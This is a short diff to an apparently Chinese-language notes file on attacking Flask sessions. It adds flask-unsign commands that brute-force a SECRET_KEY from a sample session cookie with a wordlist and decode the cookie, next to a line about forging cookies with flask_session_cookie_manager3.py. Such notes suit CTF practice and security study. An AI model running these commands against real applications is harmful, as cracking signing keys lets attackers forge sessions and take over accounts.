@@ -63,6 +63,18 @@ python flask_session_cookie_manager3.py encode -s "ckj123" -t  "{'_fresh': True,
 ^
 ## **爆破SECRET_KEY**
 用flask-unsign爆破SECRET_KEY
+```
+pip311 install flask-unsign[wordlist]
+
+
+flask-unsign --unsign -e eyJ.... --wordlist key.txt
+
+自动破解
+flask-unsign --decode --cookie 'eyJ1c2VybmFtZSI6ImxieiJ9.ZoO6sQ.1qmeqKQDnxZyPqeCWGtw_50wWss'
+自动破解并输出密钥
+flask-unsign --unsign --cookie 'eyJ1c2VybmFtZSI6ImxieiJ9.ZoO6sQ.1qmeqKQDnxZyPqeCWGtw_50wWss'
+
+```
 或./jwtcrack
 
 
